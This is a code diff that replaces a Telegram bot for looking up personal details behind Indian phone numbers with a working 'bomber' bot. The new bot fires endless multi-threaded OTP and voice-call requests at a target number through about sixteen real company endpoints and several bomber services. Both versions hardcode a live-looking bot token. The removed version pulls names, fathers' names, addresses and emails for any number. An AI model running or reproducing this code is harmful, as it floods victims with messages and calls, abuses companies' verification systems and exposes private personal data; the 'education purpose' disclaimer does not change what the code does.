@@ -1,317 +1,166 @@
-#!/usr/bin/env python3
-"""
-Telegram Number Info Bot
-A complete Telegram bot for fetching mobile number information from an API.
-
-===================================================
-REQUIRED LIBRARIES (Install via terminal/cmd):
-pip install pyTelegramBotAPI requests
-===================================================
-"""
-
-import json
 import logging
-import re
+import threading
 import time
-from typing import Dict, List, Optional, Any
-
 import requests
-import telebot
-from telebot.types import Message, ReplyKeyboardMarkup, KeyboardButton
+from concurrent.futures import ThreadPoolExecutor
+from telegram import Update
+from telegram.ext import ApplicationBuilder, ContextTypes, CommandHandler
+from flask import Flask
 
-# ===================================================
-# CONFIGURATION
-# ===================================================
-BOT_TOKEN = "9116537219:AAGYevPHlV0uaE7LaRwzzjBY1Qlq14XgA5w"
-API_URL = "https://num-to-info.asurpapa.workers.dev/api?key=@ASUR_ABOUT&number={USER_NUMBER}"
+# ================= CONFIGURATION =================
+TELEGRAM_BOT_TOKEN = "9116537219:AAGYevPHlV0uaE7LaRwzzjBY1Qlq14XgA5w"
+CHANNEL_SIGNATURE = "sk"
+# =================================================
 
-# ===================================================
-# LOGGING SETUP
-# ===================================================
+# Logging setup
 logging.basicConfig(
     format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
     level=logging.INFO
 )
 logger = logging.getLogger(__name__)
 
-# ===================================================
-# BOT INITIALIZATION
-# ===================================================
-try:
-    bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")
-    bot.get_me()
-    logger.info("✅ Bot connected successfully!")
-except Exception as e:
-    logger.error(f"❌ Bot initialization failed: {e}")
-    logger.error("Please check your BOT_TOKEN")
-    exit(1)
+# Flask app for 24/7 Cloud Uptime (Render, Koyeb, etc.)
+flask_app = Flask('')
 
-# ===================================================
-# KEYBOARD FUNCTIONS
-# ===================================================
-def get_main_keyboard() -> ReplyKeyboardMarkup:
-    """
-    Create and return the main reply keyboard with the "🔍 Get Info" button.
-    """
-    keyboard = ReplyKeyboardMarkup(
-        resize_keyboard=True,
-        one_time_keyboard=False,
-        row_width=1
+@flask_app.route('/')
+def home():
+    return "🤖 Suraj Bhai High-Speed Bomber Bot is 24/7 Alive and Active!"
+
+def run_flask():
+    flask_app.run(host='0.0.0.0', port=8080)
+
+# Global tracking variables for live stats
+BOMBER_STATS = {
+    "total_requests_sent": 0,
+    "active_targets": 0
+}
+
+# List of APIs provided for request execution
+APIS = [
+    {"name": "FreeFire Bomber",   "url": lambda p, d: f"https://freefire-api.ct.ws/bomber4.php?phone={p}&duration={d}", "method": "GET",  "headers": {"User-Agent": "Mozilla/5.0"}},
+    {"name": "Call Bomber API",   "url": lambda p, d: f"https://call-bomber-50k3t8a6r-rohit-harshes-projects.vercel.app/bomb?number={p}", "method": "GET", "headers": {"User-Agent": "Mozilla/5.0"}},
+    {"name": "Bomberr API",       "url": lambda p, d: f"https://bomberr.onrender.com/num={p}", "method": "GET", "headers": {"User-Agent": "Mozilla/5.0"}},
+    {"name": "Lenskart",          "url": lambda p, d: "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phoneCode":"+91","telephone":"{p}"}}'},
+    {"name": "Hungama",           "url": lambda p, d: "https://communication.api.hungama.com/v1/communication/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobileNo":"{p}","countryCode":"+91","appCode":"un"}}'},
+    {"name": "Meru Cab",          "url": lambda p, d: "https://merucabapp.com/api/otp/generate", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p, d: f"mobile_number={p}"},
+    {"name": "Dayco India",       "url": lambda p, d: "https://ekyc.daycoindia.com/api/nscript_functions.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p, d: f"api=send_otp&mob={p}"},
+    {"name": "NoBroker",          "url": lambda p, d: "https://www.nobroker.in/api/v3/account/otp/send", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p, d: f"phone={p}&countryCode=IN"},
+    {"name": "ShipRocket",        "url": lambda p, d: "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobileNumber":"{p}"}}'},
+    {"name": "PenPencil",         "url": lambda p, d: "https://api.penpencil.co/v1/users/resend-otp?smsType=1", "method": "POST", "headers": {"content-type": "application/json"}, "data": lambda p, d: f'{{"organizationId":"5eb393ee95fab7468a79d189","mobile":"{p}"}}'},
+    {"name": "1mg",               "url": lambda p, d: "https://www.1mg.com/auth_api/v6/create_token", "method": "POST", "headers": {"content-type": "application/json"}, "data": lambda p, d: f'{{"number":"{p}","otp_on_call":true}}'},
+    {"name": "KPN Fresh",         "url": lambda p, d: "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=WEB", "method": "POST", "headers": {"content-type": "application/json"}, "data": lambda p, d: f'{{"phone_number":{{"number":"{p}","country_code":"+91"}}}}'},
+    {"name": "Servetel",          "url": lambda p, d: "https://api.servetel.in/v1/auth/otp", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p, d: f"mobile_number={p}"},
+    {"name": "Swiggy Call",       "url": lambda p, d: "https://profile.swiggy.com/api/v3/app/request_call_verification", "method": "POST", "headers": {"content-type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
+    {"name": "Tata Capital",      "url": lambda p, d: "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}","isOtpViaCallAtLogin":"true"}}'},
+    {"name": "Doubtnut",          "url": lambda p, d: "https://api.doubtnut.com/v4/student/login", "method": "POST", "headers": {"content-type": "application/json"}, "data": lambda p, d: f'{{"phone_number":"{p}","language":"en"}}'},
+]
+
+# /start command
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    welcome_msg = (
+        f"╔═══════════════════════════════════╗\n"
+        f"✨ **Aapka Swagat Hai Suraj Bhai Ke Bomber Bot Me** ✨\n"
+        f"╚═══════════════════════════════════╝\n\n"
+        f"⚠️ **CHETAVANI / WARNING:**\n"
+        f"Yeh bot sirf aur sirf **Education Purpose** aur security/stress testing ke liye banaya gaya hai.\n\n"
+        f"🚀 **Available Commands:**\n"
+        f"👉 `/bomb <phone_number>` - High-speed multi-threaded requests shuru karne ke liye.\n"
+        f"👉 `/stats` - Live request delivery status check karne ke liye.\n\n"
+        f"👑 *Powered By:* {CHANNEL_SIGNATURE}"
     )
-    btn_get_info = KeyboardButton("🔍 Get Info")
-    keyboard.add(btn_get_info)
-    return keyboard
+    await update.message.reply_text(welcome_msg, parse_mode="Markdown")
 
+# /stats command
+async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    stats_msg = (
+        f"📊 **Bomber Live Statistics**\n"
+        f"━━━━━━━━━━━━━━━━━━━\n"
+        f"🔄 Total Requests Sent: `{BOMBER_STATS['total_requests_sent']}`\n"
+        f"🎯 Active Targets in Queue: `{BOMBER_STATS['active_targets']}`\n"
+        f"⚡ Status: High-Speed Threaded Running\n"
+        f"👑 Powered By: {CHANNEL_SIGNATURE}"
+    )
+    await update.message.reply_text(stats_msg, parse_mode="Markdown")
 
-# ===================================================
-# UTILITY FUNCTIONS
-# ===================================================
-def is_valid_mobile_number(number: str) -> bool:
-    """
-    Validate if the given string is a 10-digit mobile number.
-    """
-    number = number.strip()
-    return bool(re.match(r'^\d{10}$', number))
-
-
-def format_field(value: Any) -> str:
-    """
-    Format a field value. If None, empty, or "null", return "Not Available".
-    """
-    if value is None or value == "" or str(value).lower() == "null":
-        return "Not Available"
-    return str(value)
-
-
-def format_record(record: Dict[str, Any], index: int) -> str:
-    """
-    Format a single record into a clean message layout.
-    """
-    mobile = format_field(record.get("mobile"))
-    name = format_field(record.get("name"))
-    fname = format_field(record.get("fname"))
-    alt = format_field(record.get("alt"))
-    circle = format_field(record.get("circle"))
-    record_id = format_field(record.get("id"))
-    email = format_field(record.get("email"))
-    address = format_field(record.get("address"))
-
-    message = f"""
-╭━━━〔 📱 NUMBER INFO {index+1} 〕━━━⬣
-
-👤 Name      : {name}
-👨 Father    : {fname}
-📞 Number    : {mobile}
-📱 Alternate : {alt}
-📡 Circle    : {circle}
-🆔 ID        : {record_id}
-📧 Email     : {email}
-
-🏠 Address :
-{address}
-
-━━━━━━━━━━━━━━━━━━━━"""
-    return message.strip()
-
-
-def format_no_data(number: str) -> str:
-    """
-    Format the message when no data is found.
-    """
-    return f"""
-╭━━━〔 ❌ NO DATA FOUND 〕━━━⬣
-
-📞 Number : {number}
-
-⚠️ Is Number Ka Koi Data Nahi Hai.
-
-Please Try Another Number.
-
-╰━━━━━━━━━━━━━━━━━━⬣"""
-
-
-def fetch_number_info(number: str) -> Optional[Dict[str, Any]]:
-    """
-    Fetch number information from the API.
-    """
+# Single API execution worker function
+def send_single_request(api, target_phone):
     try:
-        url = API_URL.format(USER_NUMBER=number)
-        logger.info(f"Calling API: {url}")
+        url = api["url"](target_phone, "60")
+        headers = api["headers"]
+        
+        if api["method"] == "GET":
+            requests.get(url, headers=headers, timeout=3)
+        elif api["method"] == "POST":
+            data = api["data"](target_phone, "60")
+            requests.post(url, headers=headers, data=data, timeout=3)
+        
+        BOMBER_STATS["total_requests_sent"] += 1
+    except Exception:
+        pass
 
-        response = requests.get(url, timeout=10)
-        response.raise_for_status()
-
-        data = response.json()
-        return data
-
-    except requests.exceptions.Timeout:
-        logger.error(f"Timeout error while fetching number {number}")
-        return None
-    except requests.exceptions.ConnectionError:
-        logger.error(f"Connection error while fetching number {number}")
-        return None
-    except requests.exceptions.HTTPError as e:
-        logger.error(f"HTTP error {e} while fetching number {number}")
-        return None
-    except requests.exceptions.RequestException as e:
-        logger.error(f"Request error {e} while fetching number {number}")
-        return None
-    except json.JSONDecodeError as e:
-        logger.error(f"Invalid JSON response for number {number}: {e}")
-        return None
-    except Exception as e:
-        logger.error(f"Unexpected error while fetching number {number}: {e}")
-        return None
-
-
-def handle_number_lookup(message: Message, number: str) -> None:
-    """
-    Handle the number lookup process and response sending.
-    """
-    chat_id = message.chat.id
-    searching_msg = bot.send_message(chat_id, "🔍 Searching Information...")
-
-    data = fetch_number_info(number)
-
-    if data is None:
-        bot.edit_message_text(
-            "⚠️ Server Error.\n\nPlease Try Again Later.",
-            chat_id,
-            searching_msg.message_id
+# /bomb command handler with ThreadPoolExecutor for high speed
+async def handle_bomb_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not context.args:
+        await update.message.reply_text(
+            "❌ **Kripya target mobile number dein!**\n\n"
+            "📌 *Example:* `/bomb 9876543210`",
+            parse_mode="Markdown"
+        )
+        return
+    
+    target_phone = context.args[0].strip()
+    
+    if not target_phone.isdigit() or len(target_phone) != 10:
+        await update.message.reply_text(
+            "❌ **Galat Number!** Kripya 10 digit ka valid mobile number darj karein.\n"
+            "📌 *Example:* `/bomb 9876543210`",
+            parse_mode="Markdown"
         )
         return
 
-    records = data.get("data", [])
-    if not records or not isinstance(records, list):
-        no_data_msg = format_no_data(number)
-        bot.edit_message_text(no_data_msg, chat_id, searching_msg.message_id)
-        return
-
-    total_records = len(records)
-    bot.delete_message(chat_id, searching_msg.message_id)
-
-    for idx, record in enumerate(records):
-        formatted_record = format_record(record, idx)
-        bot.send_message(chat_id, formatted_record)
-
-    bot.send_message(chat_id, f"📊 Total Records : {total_records}")
-
-
-# ===================================================
-# BOT HANDLERS
-# ===================================================
-@bot.message_handler(commands=['start'])
-def handle_start(message: Message) -> None:
-    chat_id = message.chat.id
-    welcome_message = """
-🌟 <b>Welcome to Number Info Bot!</b>
-
-Get detailed information about any Indian mobile number instantly.
-
-Simply press the button below to get started.
-
-━━━━━━━━━━━━━━━━━━━
-<b>📌 How it works:</b>
-1️⃣ Press <code>🔍 Get Info</code>
-2️⃣ Send any 10-digit mobile number
-3️⃣ Get detailed information
-"""
-    bot.send_message(
-        chat_id,
-        welcome_message,
-        reply_markup=get_main_keyboard(),
-        parse_mode="HTML"
+    BOMBER_STATS["active_targets"] += 1
+    
+    status_msg = await update.message.reply_text(
+        f"🎯 **Target Number:** `{target_phone}`\n"
+        f"⚡ **Status:** High-speed multi-threaded requests bheji ja rahi hain...",
+        parse_mode="Markdown"
     )
+    
+    # Run in background thread using ThreadPoolExecutor for concurrent speed
+    threading.Thread(
+        target=run_threaded_bomber, 
+        args=(target_phone, context, update.effective_chat.id)
+    ).start()
 
-
-@bot.message_handler(func=lambda message: message.text == "🔍 Get Info")
-def handle_get_info(message: Message) -> None:
-    chat_id = message.chat.id
-    info_message = """
-📱 <b>Please Send Mobile Number</b>
-
-Example:
-<code>1234567890</code>
-
-✅ Send Any Valid 10 Digit Mobile Number.
-"""
-    bot.send_message(
-        chat_id,
-        info_message,
-        reply_markup=get_main_keyboard(),
-        parse_mode="HTML"
-    )
-
-
-@bot.message_handler(content_types=['text'])
-def handle_text_messages(message: Message) -> None:
-    chat_id = message.chat.id
-    user_input = message.text.strip()
-
-    if user_input.startswith('/'):
-        return
-
-    if is_valid_mobile_number(user_input):
-        handle_number_lookup(message, user_input)
-    else:
-        error_message = """
-❌ <b>Invalid Mobile Number.</b>
-
-Please send a valid 10-digit mobile number.
-Example: <code>1234567890</code>
-"""
-        bot.send_message(
-            chat_id,
-            error_message,
-            reply_markup=get_main_keyboard(),
-            parse_mode="HTML"
-        )
-
-
-@bot.message_handler(func=lambda message: True)
-def handle_all_messages(message: Message) -> None:
-    chat_id = message.chat.id
-    bot.send_message(
-        chat_id,
-        "Please use the <b>🔍 Get Info</b> button to get started.",
-        reply_markup=get_main_keyboard(),
-        parse_mode="HTML"
-    )
-
-
-# ===================================================
-# POLLING WITH ERROR HANDLING
-# ===================================================
-def run_bot() -> None:
-    logger.info("Starting Number Info Bot...")
-    logger.info(f"Bot Token: {BOT_TOKEN[:10]}...")
-    logger.info(f"API URL: {API_URL}")
-
-    while True:
-        try:
-            bot.remove_webhook()
-            bot.polling(none_stop=True, interval=1, timeout=60)
-        except telebot.apihelper.ApiTelegramException as e:
-            if "404" in str(e):
-                logger.error("❌ INVALID BOT TOKEN! Please check your BOT_TOKEN")
-                break
-            else:
-                logger.error(f"Telegram API error: {e}")
-                time.sleep(5)
-        except Exception as e:
-            logger.error(f"Bot polling error: {e}")
-            logger.info("Restarting bot in 5 seconds...")
-            time.sleep(5)
-
-
-# ===================================================
-# MAIN ENTRY POINT
-# ===================================================
-if __name__ == "__main__":
+def run_threaded_bomber(target_phone, context, chat_id):
     try:
-        run_bot()
-    except KeyboardInterrupt:
-        logger.info("Bot stopped by user.")
+        # Infinite fast loop using ThreadPoolExecutor to fire requests parallelly
+        while True:
+            with ThreadPoolExecutor(max_workers=10) as executor:
+                for api in APIS:
+                    executor.submit(send_single_request, api, target_phone)
+            
+            # Short pause between waves to prevent local thread choking
+            time.sleep(1.5)
+            
     except Exception as e:
-        logger.error(f"Fatal error: {e}")
-        raise
+        print(f"❌ Error in threaded loop: {e}")
+    finally:
+        BOMBER_STATS["active_targets"] -= 1
+
+def main():
+    flask_thread = threading.Thread(target=run_flask)
+    flask_thread.daemon = True
+    flask_thread.start()
+
+    app = ApplicationBuilder().token(TELEGRAM_BOT_TOKEN).build()
+
+    app.add_handler(CommandHandler("start", start))
+    app.add_handler(CommandHandler("stats", stats_command))
+    app.add_handler(CommandHandler("bomb", handle_bomb_command))
+
+    print(f"🤖 Suraj Bhai High-Speed Bomber Bot is up and running [Powered by {CHANNEL_SIGNATURE}]...")
+    app.run_polling()
+
+if __name__ == '__main__':
+    main()
